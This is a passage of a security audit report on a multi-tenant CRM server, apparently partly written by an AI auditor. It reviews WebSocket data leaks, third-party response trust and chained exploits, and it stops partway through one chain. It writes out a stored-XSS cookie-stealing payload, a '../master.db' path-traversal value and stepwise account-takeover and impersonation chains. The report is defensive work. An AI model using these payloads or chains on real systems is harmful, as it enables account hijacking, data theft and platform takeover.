### [INFO] runAutomations fire-and-forget IIFE risks inconsistent state on tenant pool eviction

**Where:** `packages/server/src/services/automations.ts` (runAutomations function)

**What:**
`runAutomations()` is explicitly designed as fire-and-forget: it launches `(async () => { … })()` and returns `void`. The IIFE may execute `executeSendSms`, `executeSendEmail`, `executeChangeStatus` which write to the tenant DB passed as a closure parameter. If the tenant pool evicts that DB handle between when `runAutomations` is called and when the async work completes (possible under memory pressure with many active tenants), the writes will fail. The error is caught and logged but the automation state is left inconsistent — a status change might be half-applied (email sent but DB row not updated).

**Code:**
```typescript
// automations.ts
export function runAutomations(db, trigger, context, execContext?): void {
  (async () => {
    try {
      // ... loop over rules, call executeSendSms/Email/ChangeStatus(db, ...)
    } catch (err) {
      logger.error('Automation pipeline error', { trigger, err });
    }
  })();
}
```

**Exploit:**
Under high load with a large tenant pool, a tenant's DB may be evicted mid-automation. A ticket-close trigger fires `runAutomations`; the eviction happens; `executeChangeStatus` fails silently; the ticket remains in wrong status, automation rule marked as triggered but effect not applied. Not directly exploitable but causes audit log / state divergence.

**Fix:**
For correctness, `runAutomations` should either (a) re-acquire the DB via `getTenantDb(slug)` at the start of the IIFE rather than using the closure reference, or (b) be converted to a proper queued job. At minimum, document the eviction risk and consider adding the in-flight promise to a tracking set per tenant.

---


---

# T28-ws-authz

# T28 — WebSocket Per-Message-Type Authorization Matrix & Broadcast Scoping

**Scope:** `packages/server/src/ws/server.ts`, `routes/teamChat.routes.ts`,
`routes/notifications.routes.ts`, `services/notifications.ts`

---

### [HIGH] scrubSensitive() misses device.security_code in ticket broadcasts

**Where:** `packages/server/src/ws/server.ts:49–93` (scrubSensitive), `routes/tickets.routes.ts:390` (device shape), `routes/tickets.routes.ts:1281` (broadcast call)

**What:**
`scrubSensitive()` strips `SENSITIVE_CUSTOMER_FIELDS` from `payload.customer` and `SENSITIVE_PAYMENT_FIELDS` from `payload.payments`, but it does **not recurse into `payload.devices`**. The `getFullTicketAsync` helper embeds `security_code` (device PIN/passcode) directly in each device object (line 390). Because `scrubSensitive` only shallow-processes the top-level object and specifically handles `customer` and `payments`, the `devices[]` array passes through untouched. All `ticket:created`, `ticket:updated`, and `ticket:status_changed` broadcasts carrying a full ticket payload therefore deliver `security_code` to every non-finance role socket in the tenant bucket.

**Code:**
```typescript
// ws/server.ts — scrubSensitive only handles customer + payments, skips devices[]
const needsScrub =
  (p.customer && typeof p.customer === 'object') ||
  Array.isArray(p.payments) || ...;
if (!needsScrub) return payload;
const out: Record<string, unknown> = { ...p };
// out.devices is never touched — security_code, imei, serial pass through

// tickets.routes.ts getFullTicketAsync line 390:
{
  security_code: d.security_code,  // device PIN/passcode
  imei: d.imei,
  serial: d.serial,
  ...
}
```

**Exploit:**
A cashier role (or any non-finance staff) connects to WebSocket and receives a `ticket:updated` event when a technician updates a repair ticket. The event JSON includes `devices[0].security_code = "1234"` — the customer's device unlock PIN. The cashier did not need `invoices.view` or finance access to receive this field; they only need an active session.

**Fix:**
Extend `scrubSensitive` to recurse into `out.devices` (and any other nested arrays/objects). Either add `if (Array.isArray(p.devices)) { out.devices = p.devices.map(scrubDevice); }` with a `SENSITIVE_DEVICE_FIELDS = ['security_code']` list, or explicitly delete `security_code` from each device entry before broadcast.

---

### [MEDIUM] sms:received broadcast sends full SMS body and phone numbers to all tenant users regardless of sms.view permission

**Where:** `packages/server/src/routes/sms.routes.ts:1165`, `packages/server/src/ws/server.ts:674–698` (broadcast loop)

**What:**
When an inbound SMS arrives via webhook, the server broadcasts `sms:received` carrying `{ message: msg, customer }` where `msg = SELECT * FROM sms_messages` — including `from_number`, `to_number`, `conv_phone`, and the raw `message` body. The `broadcast()` function delivers this to every authenticated socket in the tenant bucket with no permission filter. A `cashier` role lacks `sms.view` in `ROLE_PERMISSIONS` but will still receive every inbound SMS in real time over WebSocket.

**Code:**
```typescript
// sms.routes.ts:1124–1165
const customer = await adb.get<any>(
  'SELECT id, first_name, last_name, sms_opt_in FROM customers WHERE ...'
);
// msg = SELECT * FROM sms_messages (includes from_number, message body, conv_phone)
broadcast(WS_EVENTS.SMS_RECEIVED, { message: msg, customer: customer || null },
  req.tenantSlug || null);
// broadcast() iterates entire tenant bucket — no role check
```

**Exploit:**
A cashier opens the WS connection, authenticates, and listens. Any inbound customer SMS — including personal messages ("my password is X", health details in the message body) — arrives in the cashier's WS stream even though the cashier tab has no SMS inbox UI. The `from_number` also exposes customer phone numbers to all staff.

**Fix:**
Add a role check inside `broadcast()` (or create a `broadcastToRole(roles, ...)` variant) so `sms:received` is only delivered to sockets where `ws.role` is in `['admin', 'manager', 'technician']` (roles that have `sms.view`). Alternatively use `sendToUser` for each user whose permissions include `sms.view`.

---

### [MEDIUM] voice:call_initiated and voice:inbound_call broadcast full call log (phone numbers, provider_call_id, transcription URL) to all tenant users

**Where:** `packages/server/src/routes/voice.routes.ts:162–164`, `voice.routes.ts:757`

**What:**
`voice:call_initiated` sends `{ call: callLog }` where `callLog = SELECT * FROM call_logs`, containing `from_number`, `to_number`, `conv_phone`, `provider_call_id`, `recording_url`, and `transcription`. `voice:inbound_call` sends `{ from: event.from, callId: event.providerCallId }` exposing the raw caller phone number. Both go to every socket in the tenant bucket with no voice/call permission check. There is no `voice.*` permission defined in `ROLE_PERMISSIONS`; the routes are gated by `authMiddleware` only.

**Code:**
```typescript
// voice.routes.ts:162
const callLog = await adb.get<AnyRow>('SELECT * FROM call_logs WHERE id = ?', ...);
broadcast('voice:call_initiated', { call: callLog }, req.tenantSlug || null);

// voice.routes.ts:757 — inbound webhook
broadcast('voice:inbound_call', { from: event.from, callId: event.providerCallId },
  req.tenantSlug || null);
```

**Exploit:**
A cashier's browser receives every outbound call event including who was called (`to_number`), the Twilio `provider_call_id` (correlatable with Twilio console), and later via a second broadcast, any recording URL. A cashier with no business reason to see call logs can build a list of every customer phone number dialed from the shop.

**Fix:**
Add a `settings.view` or a new `calls.view` permission and filter recipients in the WS broadcast path. For voice events that originate from unauthenticated webhooks (inbound/recording/transcription), the broadcast should use `broadcastToRole(['admin', 'manager', 'technician'], ...)`.

---

### [MEDIUM] management:stats, management:crash, and management:update_available leak server internals to all users in single-tenant mode

**Where:** `packages/server/src/index.ts:2380`, `index.ts:3886`, `services/githubUpdater.ts:337`

**What:**
All three broadcasts call `broadcast(event, data)` without a `tenantSlug` argument (default `null`). The `broadcast()` function routes to the `clientsByTenant` bucket keyed `'null'`. In **single-tenant mode** (`MULTI_TENANT !== 'true'`), every authenticated user's JWT has `tenantSlug = null`, so all users (including cashiers) are registered in the `'null'` bucket. They therefore receive: (a) process memory (RSS, heap), uptime, and request rate every 5 seconds via `management:stats`; (b) fatal crash entries including error message, route path, and redacted-but-partial stack trace via `management:crash`; (c) pending GitHub commit SHAs and commit messages via `management:update_available`.

**Code:**
```typescript
// index.ts:2380 — no tenantSlug, defaults to null → 'null' bucket → all single-tenant users
broadcast('management:stats', {
  uptime: process.uptime(), memory: { rss, heapUsed, heapTotal },
  activeConnections: allClients.size, requestsPerSecond, requestsPerMinute,
});
// index.ts:3886
try { broadcast('management:crash', entry); } catch { ... }
```

**Exploit:**
A cashier in a single-tenant shop opens DevTools, observes `management:stats` frames arriving every 5 seconds with exact heap usage, and `management:update_available` frames revealing the git commit SHA and commit message of the next pending update. If a crash occurs, they see the internal route path and error message — useful for reconnaissance before an attack.

**Fix:**
Pass an explicit `tenantSlug` of `'__management__'` (a never-issued JWT tenant) so the bucket is always empty for regular users, and deliver management events only to sockets where `ws.role === 'admin'` (or via a dedicated Electron IPC channel rather than the shared WS bus).

---

### [MEDIUM] TeamChat ticket channels readable/writable by any authenticated user — no ticket-access check

**Where:** `packages/server/src/routes/teamChat.routes.ts:58–66`, `index.ts:1779`

**What:**
`GET /api/v1/team-chat/channels/:id/messages` and `POST /api/v1/team-chat/channels/:id/messages` call `assertChannelAccess(ch, req)` which immediately returns for `kind === 'ticket'` (line 59). The routes are mounted behind `authMiddleware` only — no `requirePermission`. Any authenticated user (including a cashier who does not work repair tickets) can read or post to the internal discussion channel of any ticket, including channels for tickets they are not assigned to. Ticket channels are listed in `GET /channels` without filtering by ticket assignment.

**Code:**
```typescript
// teamChat.routes.ts:58–66
function assertChannelAccess(ch: ChannelRow, req: any): void {
  if (ch.kind === 'general' || ch.kind === 'ticket') return; // no check for 'ticket'
  ...
}
// index.ts:1779
app.use('/api/v1/team-chat', authMiddleware, teamChatRoutes); // no requirePermission
```

**Exploit:**
A cashier who knows (or guesses) a `channelId` can `GET /api/v1/team-chat/channels/42/messages` to read all internal technician notes for ticket #42 — including device security codes discussed in chat, internal pricing, or escalation notes. They can also `POST` to inject messages into the channel under their own name, potentially misdirecting the technician.

**Fix:**
For `kind === 'ticket'`, verify the caller has `requirePermission('tickets.view')` (add as a middleware on the message sub-routes), or check that `ticket_id` is accessible to the user via the standard tickets ACL. Add `requirePermission('tickets.view')` to the team-chat channel messages routes, or gate the entire `/channels/:id/messages` path with it.

---

### [LOW] voice:recording_ready leaks server filesystem path to all tenant users

**Where:** `packages/server/src/routes/voice.routes.ts:633`

**What:**
When a voice recording webhook fires, the recording is saved to disk and its absolute local path stored in `call_logs.recording_local_path`. The subsequent WS broadcast sends `{ callId: call.id, localPath }` where `localPath` is the actual server filesystem path (e.g. `/var/www/bizarrecrm/data/uploads/recordings/1746123456-a1b2.mp3`). This path reveals the server's directory structure and deployment layout to every connected tenant user.

**Code:**
```typescript
// voice.routes.ts:633
broadcast('voice:recording_ready', { callId: call.id, localPath }, req.tenantSlug || null);
```

**Exploit:**
An attacker with a cashier account receives `localPath = '/home/ubuntu/app/uploads/recordings/1746000000-c3d4.mp3'` — they learn the server's home directory, the app's upload path, and the fact that the service runs as `ubuntu`. This assists path traversal attempts on other endpoints.

**Fix:**
Strip `localPath` from the WS broadcast payload entirely; only emit `callId` and a relative public URL (if applicable). The client can fetch the recording via `GET /api/v1/voice/calls/:id/recording` which already enforces ownership.

---

### [LOW] pos.routes.ts broadcasts INVOICE_CREATED without tenantSlug — event silently dropped for all tenant users in multi-tenant mode

**Where:** `packages/server/src/routes/pos.routes.ts:1323`

**What:**
`broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id, order_id })` is called without a `tenantSlug` argument, so it defaults to `null` and routes to the `'null'` bucket (super-admin / management sockets only). In multi-tenant mode, all tenant users have a non-null `tenantSlug` and are in their own bucket — they never receive `invoice:created` events from POS checkout. This is a **functional gap** (missing real-time POS updates) that also implies there is no RBAC pressure being exerted on this broadcast path even though POS sales involve financial data.

**Code:**
```typescript
// pos.routes.ts:1323
broadcast(WS_EVENTS.INVOICE_CREATED, { invoice_id: inv.id, order_id: invoiceOrderId });
// missing third arg — req.tenantSlug || null
```

**Exploit:**
In multi-tenant mode a tenant's dashboard never refreshes when a POS sale completes — operators must manually reload. More importantly: if this is "fixed" by adding `req.tenantSlug || null`, that broadcast will start reaching cashiers, who would then also receive the associated `invoice:payment` event carrying payment details — confirming the broadcast-scope review is necessary before fixing the missing tenantSlug.

**Fix:**
Pass `req.tenantSlug || null` as the third argument. Before doing so, verify the payload (`{ invoice_id, order_id }`) contains no PII; it appears safe currently as it only carries IDs.

---

### [INFO] Binary WebSocket frames silently accepted and processed as UTF-8 text

**Where:** `packages/server/src/ws/server.ts:369`

**What:**
The `message` handler converts binary frames to UTF-8 strings unconditionally: `const raw = typeof data === 'string' ? data : data.toString('utf8')`. Binary frames are then parsed and handled exactly like text frames (auth, rate-limit checks, etc.). While no binary-specific logic exists, WAFs, IDS systems, and logging pipelines that inspect the WebSocket stream as UTF-8 text frames may miss binary-encoded auth attempts or obfuscated payloads.

**Code:**
```typescript
// ws/server.ts:369
const raw = typeof data === 'string' ? data : data.toString('utf8');
```

**Exploit:**
An attacker sends a binary WebSocket frame containing `{ "type": "auth", "token": "..." }`. The server accepts and processes it identically to a text frame. WAFs configured to inspect WS text frames only may miss this path.

**Fix:**
Explicitly reject binary frames before processing: `if (typeof data !== 'string') { ws.close(1003, 'text frames only'); return; }`. The current `ws` library passes `isBinary` as the second argument to `data`; check it.

---

### [INFO] sendToUser exported but never called anywhere in the codebase

**Where:** `packages/server/src/ws/server.ts:704`

**What:**
`sendToUser(userId, event, data, tenantSlug)` is exported but no module imports or calls it. All targeted delivery is done via `broadcast()` which sends to all users in a tenant bucket. The absence of per-user delivery means there is no mechanism for sending user-specific notifications (e.g. `notification:new`) over WebSocket — the `NOTIFICATION_NEW` WS event defined in `WS_EVENTS` is similarly never broadcast server-side.

**Fix:**
Either wire `sendToUser` to the notifications flow (route `notifications.routes.ts` DB inserts to `sendToUser` after write), or remove the dead export to reduce the attack surface review burden for future auditors.

---


---

# T29-provider-trust

# T29 — Provider / 3rd-Party API Response Trust Boundary

**Audited files:**
- `packages/server/src/services/stripe.ts`
- `packages/server/src/services/blockchyp.ts`
- `packages/server/src/services/cloudflareDns.ts`
- `packages/server/src/services/githubUpdater.ts`
- `packages/server/src/services/catalogScraper.ts`
- `packages/server/src/services/catalogSync.ts`
- `packages/server/src/services/walletPass.ts`
- `packages/server/src/services/email.ts`
- `packages/server/src/providers/sms/twilio.ts`
- `packages/server/src/providers/sms/vonage.ts`
- `packages/server/src/providers/sms/telnyx.ts`
- `packages/server/src/providers/sms/bandwidth.ts`
- `packages/server/src/providers/sms/plivo.ts`
- `packages/server/src/providers/sms/index.ts`
- `packages/server/src/routes/geocode.routes.ts`
- `packages/server/src/routes/sms.routes.ts`
- `packages/server/src/routes/fieldService.routes.ts`
- `packages/server/src/routes/customers.routes.ts`
- `packages/server/src/routes/catalog.routes.ts`

---

### MEDIUM — `customer.subscription.updated` ignores `trialing`/`past_due` status: paying tenant keeps plan indefinitely

**Where:** `packages/server/src/services/stripe.ts:897-926`

**What:**
The `customer.subscription.updated` webhook handler only acts on `status === 'active'` (upgrade to pro) and `status === 'canceled' || status === 'unpaid'` (downgrade to free). Stripe's subscription state machine also produces `'trialing'`, `'past_due'`, `'incomplete'`, and `'incomplete_expired'`. A subscription that legitimately transitions from `active` → `past_due` via this webhook leaves the tenant on `plan = 'pro'` indefinitely because the status update silently falls through both branches without touching the tenant row. The `invoice.payment_failed` path does handle `past_due` separately, but a provider-side feature change or a MitM that substitutes `status: "trialing"` in the response body would block the downgrade path entirely.

**Code:**
```typescript
if (sub.status === 'active') {
  masterDb.prepare(`UPDATE tenants SET plan = 'pro', ... WHERE id = ?`).run(tenantWithSub.id);
} else if (sub.status === 'canceled' || sub.status === 'unpaid') {
  masterDb.prepare(`UPDATE tenants SET plan = 'free', ... WHERE id = ?`).run(tenantWithSub.id);
}
// 'trialing', 'past_due', 'incomplete', 'incomplete_expired' — silently no-op
```

**Exploit:**
A compromised provider sub-account, misconfigured TLS, or a future Stripe API change that emits `status: "past_due"` instead of `status: "unpaid"` on cancellation would leave a downgraded tenant continuing to access paid-tier features. Additionally an attacker who can forge a single `customer.subscription.updated` event body (bypassing signature via a compromised Stripe test-mode credential) with `status: "trialing"` would neutralise a legitimate cancellation already in flight.

**Fix:**
Add an explicit `else` branch (or a `default` label) that sets `payment_past_due = 1` for `'past_due'` and downgrades to `'free'` for `'incomplete_expired'`/`'incomplete'` beyond their collection window. At minimum add a `default` log-and-alert branch so silent fall-through is impossible.

---

### MEDIUM — Nominatim geocode response: no Content-Length cap, no response-body size guard

**Where:** `packages/server/src/routes/geocode.routes.ts:36-47`

**What:**
`/api/v1/geocode` proxies a request to `https://nominatim.openstreetmap.org/search` and calls `response.json()` directly on the full response. There is no Content-Length check and no buffered-read cap. A MitM or a future Nominatim API version that returns a large response (e.g., hundreds of results instead of `limit=1`) would cause Node.js's built-in fetch to buffer the entire response body before `json()` can parse it. The catalogScraper and cloudflareDns services both implement the 10 MiB / arrayBuffer cap pattern; the geocode handler does not.

**Code:**
```typescript
const response = await fetch(url.toString(), {
  headers: { 'User-Agent': USER_AGENT, 'Accept-Language': 'en' },
  signal: AbortSignal.timeout(5000),
});
// No content-length check
body = await response.json();  // unbounded buffer
```

**Exploit:**
A compromised Nominatim DNS (DNS rebinding, BGP hijack, or a hypothetical self-hosted Nominatim whose config is flipped) returns a multi-megabyte JSON array. Every geocode lookup by any tenant exhausts Node.js heap proportionally; at moderate request rates this becomes a per-request memory DoS that can OOM the process.

**Fix:**
Add a `Content-Length` header check against a cap (e.g. 512 KB) before calling `json()`, or switch to `arrayBuffer()` with a streaming cap. Mirror the pattern already used in `catalogScraper.ts:430-443`.

---

### LOW — Geocode coordinates returned to client lack bounds validation: `customers.routes.ts` silently stores out-of-range lat/lng from geocode response

**Where:** `packages/server/src/routes/customers.routes.ts:1051-1052` and `packages/server/src/routes/geocode.routes.ts:59-66`

**What:**
`geocode.routes.ts` returns coordinates parsed via `parseFloat` with only an `isNaN` guard (line 62). There is no `-90 ≤ lat ≤ 90` / `-180 ≤ lng ≤ 180` bounds check on the geocode response. The fieldService routes correctly validate with `validateLatLng()`, but `customers.routes.ts` writes lat/lng from the request body with only an `isFinite` check (lines 1051-1052 and 1399-1407). A poisoned Nominatim response returning coordinates outside the valid range (or sentinel values like `999` or `-999`) would be silently stored in the `customers` table, poisoning haversine routing calculations.

**Code:**
```typescript
// geocode.routes.ts — no range guard
const lat = parseFloat(String(first.lat ?? ''));
const lng = parseFloat(String(first.lon ?? ''));
if (isNaN(lat) || isNaN(lng)) {  // only NaN check, not range
  return void res.json({ success: true, data: null });
}

// customers.routes.ts — only isFinite, no range
const lat = typeof inputAny.lat === 'number' && isFinite(inputAny.lat) ? inputAny.lat : null;
const lng = typeof inputAny.lng === 'number' && isFinite(inputAny.lng) ? inputAny.lng : null;
```

**Exploit:**
A compromised geocode provider returns `lat: 999, lng: 999`. The geocode route passes them through; the client stores them via `PATCH /customers/:id`. Any query that computes haversine distances from these rows silently returns corrupted route-optimization data. The values `999`/`-999` are `isFinite()` truthy and would pass validation in both locations.

**Fix:**
Add `lat < -90 || lat > 90` / `lng < -180 || lng > 180` rejection in `geocode.routes.ts` before emitting the response, and apply the same bounds check in `customers.routes.ts` (mirroring the `fieldService.routes.ts:validateLatLng` helper).

---

### LOW — Inbound SMS message body: no application-level length cap before DB write and auto-responder matching

**Where:** `packages/server/src/routes/sms.routes.ts:1032-1093`

**What:**
After provider signature verification, `msgBody` is written to `sms_messages.message` (line 1032) and then immediately passed into `tryAutoRespond` (line 1092). While the global `express.urlencoded` parser caps the entire request body at 1 MB (index.ts line 1233), that cap is for the full multi-field form body. Twilio and other providers may send large concatenated SMS messages (via multiple SMS segments with no client-enforced limit). There is no application-level max-length check on `msgBody` before the DB write or the regex-based auto-responder matching. A compromised or MitM provider response that maximises the body field to the full 1 MB limit would write a 1 MB string to the DB and force all auto-responder regexes to run against it.

**Code:**
```typescript
const { from, to, body: msgBody, providerId, media, messageType } = parsed;
// ...
await adb.run(
  `INSERT INTO sms_messages (..., message, ...) VALUES (?, ...)`,
  from, to || '', convPhone, msgBody, ...   // no length cap on msgBody
);
// ...
const match = await tryAutoRespond(adb, { from: convPhone, body: msgBody, ... });
```

**Exploit:**
A MitM that injects a 900 KB `Body` field in a Twilio-style URL-encoded webhook payload (staying under the 1 MB urlencoded limit) causes the server to write 900 KB to the `sms_messages` table on every inbound message, and runs all configured auto-responder regexes (which may include pathological patterns) against it. At the Twilio webhook rate-limit of 60/min, this is 54 MB of DB writes per minute plus regex work per message.

**Fix:**
Truncate or reject `msgBody` exceeding a reasonable SMS limit (e.g. 10,000 characters covers 14 concatenated segments) immediately after `parseInboundWebhook` and before the DB write. Log a warning if a provider sends an oversized body.

---

### LOW — `customer.subscription.updated` with `status: 'active'` unconditionally upgrades any plan to `pro` without checking the subscribed price ID

**Where:** `packages/server/src/services/stripe.ts:897-907`

**What:**
When `customer.subscription.updated` fires with `status: 'active'`, the handler upgrades the tenant to `plan = 'pro'` without verifying that `sub.items.data[0].price.id` matches the configured `STRIPE_PRO_PRICE_ID` or `STRIPE_ENTERPRISE_PRICE_ID`. A compromised Stripe sub-account or a provider API change that sets any subscription to `active` (e.g. a free-tier Stripe product accidentally linked to a customer) would cause the tenant to be elevated to `pro` without any payment validation.

**Code:**
```typescript
if (sub.status === 'active') {
  masterDb.prepare(
    `UPDATE tenants SET plan = 'pro', failed_charge_count = 0, payment_past_due = 0, ...`
  ).run(tenantWithSub.id);
}
// No check: is sub.items.data[0]?.price.id === config.stripeProPriceId ?
```

**Exploit:**
A Stripe test-mode key leaks to an attacker who creates a free/trial product and subscribes a tenant to it. When Stripe fires `customer.subscription.updated` with `status: 'active'`, the tenant is set to `plan = 'pro'` regardless of what product they are subscribed to. Note: the webhook signature is valid (real Stripe event), so signature checks do not help here.

**Fix:**
Validate `sub.items.data[0]?.price.id` against the configured price IDs before granting `plan = 'pro'`. Unknown or mismatched price IDs should log a warning and leave the plan unchanged (or set to free). This mirrors how `updateSubscription` explicitly calls `resolvePriceIdForPlan()`.

---

### INFO — `catalogScraper` bulk-import path accepts `image_url` / `product_url` from admin without protocol validation

**Where:** `packages/server/src/routes/catalog.routes.ts:468-469`

**What:**
The `/bulk-import` endpoint validates `image_url` and `product_url` only for length (2048 chars). There is no `http:`/`https:` protocol filter analogous to the one applied to scraped image URLs in `catalogScraper.ts:295-305`. A privileged admin who imports a CSV with `javascript:alert(1)` or `data:text/html,...` in `image_url` would store those values in `supplier_catalog`. The frontend rendering of `<img src="{image_url}">` on the catalog page would then execute JavaScript in the admin's browser.

**Code:**
```typescript
// catalog.routes.ts:468-469 (bulk-import)
const imageUrl = item.image_url ? validateTextLength(String(item.image_url).trim(), 2048, 'item.image_url') : null;
const productUrl = item.product_url ? validateTextLength(String(item.product_url).trim(), 2048, 'item.product_url') : null;
// No protocol check; catalogScraper.ts:292-304 has the guard only on the scraper path
```

**Exploit:**
A rogue admin (or a compromised admin session) imports a catalog CSV with `image_url: "javascript:alert(document.cookie)"`. The value passes the length check and is stored in `supplier_catalog`. Whenever the catalog page renders a product thumbnail, the browser executes the stored JavaScript in the admin context.

**Fix:**
Apply the same URL allowlist check from `catalogScraper.ts:292-305` to the `/bulk-import` and any other manual-insert path (including `catalog.routes.ts` line 796 `parts_order_queue.image_url`). Extract the check into a shared helper `validateCatalogUrl(url)` and call it from both paths.

---

## SCOPE CLEARED — items verified safe

1. **Stripe webhook signature** (`stripe.ts:529-539`): Uses `stripe.webhooks.constructEvent` with explicit `WEBHOOK_TOLERANCE_SECONDS = 300`. Relies on Stripe SDK HMAC-SHA256; no custom implementation. Safe.

2. **Stripe plan field trust** (`stripe.ts:760-841`): `checkout.session.completed` sets plan to hardcoded string `'pro'` — never interpolates any Stripe response field as the plan name. `updateSubscription` uses `resolvePriceIdForPlan()` which validates against a closed enum. Safe.

3. **BlockChyp `approved` field** (`blockchyp.ts:495-503`): Charge success path gates on `data.approved === true` (boolean). The service does not trust arbitrary string status fields. `reconcileAfterTimeout` also gates on `data.approved`. Safe.

4. **BlockChyp `sigFile` field** (`blockchyp.ts:506-509`): Treated as hex-encoded bytes, written to disk via `saveSignatureFile` using `Buffer.from(sigFileHex, 'hex')` — invalid hex is silently truncated by Node, never passed to a shell or template. Safe.

5. **GitHub updater tarball** (`githubUpdater.ts`): `performUpdate` is explicitly stubbed to return `{ success: false }` — no tarball download or execution occurs server-side. The `checkForUpdates` path only uses `git fetch` + `git rev-parse` via `execFile` (no shell, no tarball), with UP1/UP2/UP3 guards for SHA pinning, origin URL verification, and downgrade rejection. Safe.

6. **Cloudflare DNS response fields** (`cloudflareDns.ts:123-128`): `cfRequest` validates `body.success === true` before trusting `body.result`. The returned record `.id` (a string) is stored via parameterized SQL in `tenants.cloudflare_record_id`. No untrusted fields are interpolated into HTML or commands. Safe.

7. **SMS provider webhook signature** (all providers in `providers/sms/`): Twilio uses HMAC-SHA1 with `timingSafeEqual`; Telnyx uses Ed25519 with raw-body + timestamp replay guard; Vonage uses `verifyVonageJwt` with HS256 + `payload_hash` binding; Plivo uses HMAC-SHA256 V3; Bandwidth uses Basic auth with `timingSafeEqual`. All fail closed. Safe.

8. **WalletPass HTML escaping** (`walletPass.ts:51-58`, `197-248`): All customer-derived fields are passed through `escapeHtml()` before interpolation into the HTML template. No raw database values reach the HTML output. Safe.

9. **Email HTML sanitization** (`email.ts:169-187`): `sanitizeEmailHtml` strips `<script>` blocks, inline `on*=` handlers, and `javascript:` URLs. Body capped at 200 KB. `sanitizeSubject` strips CR/LF. Combined with nodemailer's parameterized header construction, SMTP header injection is not possible via these inputs. Safe.

10. **Geocode coordinate NaN handling** (`geocode.routes.ts:62-65`): `isNaN` check prevents `NaN` from propagating. However, bounds validation is missing (see MEDIUM finding above).


---

# T30-chains

# T30 — Chained-Exploit / Second-Order Analysis

**Auditor:** Claude Sonnet 4.6 (T30 slot)
**Date:** 2026-05-06
**Method:** Read all S01-S36 and T01-T12 findings; identified combinations whose joint impact exceeds either component alone.

---

### [CRITICAL] Chain 1: skipEmailVerification + password_set=0 ATO → mass tenant takeover under victim emails

**Components:** S02-P2-01 (`skipEmailVerification = true`) + S01-P2-01 (`password_set=0` challenge issued before password check)

**Combined exploit:**
1. Attacker POSTs `POST /signup` with `admin_email: victim@company.com` — `skipEmailVerification=true` immediately provisions a full tenant and issues admin JWT to the attacker. No SMTP confirmation needed.
2. The attacker now controls a tenant with `admin.password_set = 1` (set at provisioning). But for any *subsequently created staff accounts* via `POST /settings/users`, those accounts have `password_set = 0`.
3. An attacker who also discovers a staff username on tenant-B (via the ungated `GET /employees` — S09-P2-02) can POST to tenant-B's `/auth/login` with that username and any password string, receive a challenge token (S01-P2-01), and call `POST /auth/login/set-password` to hijack that account entirely.
4. Combined: adversary creates unlimited tenants under victim emails (no email proof), and for each newly discovered `password_set=0` staff member can hijack accounts with zero credential knowledge.

**Combined severity:** CRITICAL — unauthenticated, unlimited, no prior knowledge of passwords required.

**Cheapest break:** Revert `skipEmailVerification` to the env-flag expression (one-line fix in `signup.routes.ts:618`). This eliminates the mass tenant flood before `password_set=0` can be leveraged.

---

### [CRITICAL] Chain 2: `requireStepUpTotpSuperAdmin` wrong column names (500) + impersonation missing step-up → super-admin impersonates any tenant freely

**Components:** S05-P2-01 (`totp_secret` vs `totp_secret_enc` — all step-up routes return 500) + S05-01 (impersonation missing `requireStepUpTotpSuperAdmin`)

**Combined exploit:**
1. S05-P2-01 means every route that *does* require step-up TOTP throws HTTP 500, effectively disabling destructive gates (delete, suspend, plan-change, JWT-rotate, etc.). At first glance this looks like a DoS on operations, not an escalation.
2. However, `POST /tenants/:slug/impersonate` (S05-01) is the *one* destructive super-admin action that was never gated with `requireStepUpTotpSuperAdmin`. It therefore works perfectly while all other step-up routes are broken.
3. A super-admin attacker (or anyone who steals a super-admin JWT within its 30-minute TTL) can call `/impersonate` on every tenant without any TOTP challenge — issuing a 15-minute admin token per tenant, looting all tenant data, while the "correct" guardrails (TOTP) are permanently crashed.

**Combined severity:** CRITICAL — the column-name bug paradoxically makes impersonation *worse*: it's the only escape hatch that remains open while everything else is locked by 500s.

**Cheapest break:** Fix S05-P2-01 first (rename query columns in `stepUpTotp.ts:362`). Once TOTP step-up is functional, S05-01's missing gate can be added normally. Fixing column names is a two-line edit.

---

### [CRITICAL] Chain 3: WS auth skips session revocation + WS token-type confusion → revoked/long-lived credential gives indefinite data access

**Components:** S30-HIGH (WS auth: no session DB lookup) + S30-MEDIUM (no `payload.type==='access'` check) + S06 (transition period: both token types share `JWT_SECRET` fallback)

**Combined exploit:**
1. During the `ACCESS_JWT_SECRET` transition window (before split secrets are set), access and refresh tokens are both signed with `JWT_SECRET`. A refresh token (90-day lifetime) passes WS signature verification (S30-MEDIUM).
2. Even after the transition, a stolen access token (1-hour lifetime) authenticates a WS connection. When the victim logs out (session row deleted), the HTTP layer blocks future requests but the attacker's WS socket continues receiving all tenant broadcasts forever (S30-HIGH).
3. Combining: attacker intercepts a refresh token (e.g., via `/api/v1/auth/refresh` SSRF or shared kiosk cookie). Presents it to WS auth. Socket is accepted with a 90-day effective lifetime. No session check, no token-type check. Victim can never revoke this access without rotating `REFRESH_JWT_SECRET`.

**Combined severity:** CRITICAL — 90-day unrevocable access to all tenant WS broadcasts (tickets, SMS, invoices, customer PII).

**Cheapest break:** Add `payload.type === 'access'` check inside WS auth handler (one-line, S30-MEDIUM). Costs nothing but immediately closes the refresh-token WS entry point. The session revocation check (S30-HIGH) is a harder fix but can follow.

---

### [CRITICAL] Chain 4: db_path not containment-validated + super-admin backup restore → overwrite master.db

**Components:** S08-P2-04 (`db_path` column used in file ops without `startsWith` check) + S05 (super-admin impersonation / backup restore)

**Combined exploit:**
1. A super-admin (or attacker with a hijacked super-admin JWT — possible via S05-01 or S05-P2-02 XSS) sets `tenants.db_path = '../master.db'` via direct DB manipulation or via any SQL-execution path that writes to the master DB.
2. Calls `POST /super-admin/api/tenants/{slug}/backups/{file}/restore`.
3. `backupRestore(tdb, filename, { targetDbPath: path.join(tenantDataDir, '../master.db') })` overwrites `master.db` with an attacker-crafted SQLite file.
4. New `master.db` carries a super-admin row with attacker's own bcrypt hash — permanent super-admin access. All tenants are now compromised.

**Combined severity:** CRITICAL — full platform takeover; persistent access via master credential replacement.

**Cheapest break:** Add `path.resolve(targetDbPath).startsWith(path.resolve(config.tenantDataDir))` assertion before every `backupRestore` call (S08-P2-04 fix). This costs 2 lines and blocks the file-escape regardless of `db_path` value.

---

### [CRITICAL] Chain 5: Invoice payment race (TOCTOU) + loyalty double-earn + `reverseLoyaltyPoints` never called → unbounded loyalty fraud

**Components:** T01-CRITICAL (invoice payment INSERT+SUM+SET not atomic) + S22-HIGH (no UNIQUE on loyalty_points reference) + S22-HIGH (`reverseLoyaltyPoints` exported but never called)

**Combined exploit:**
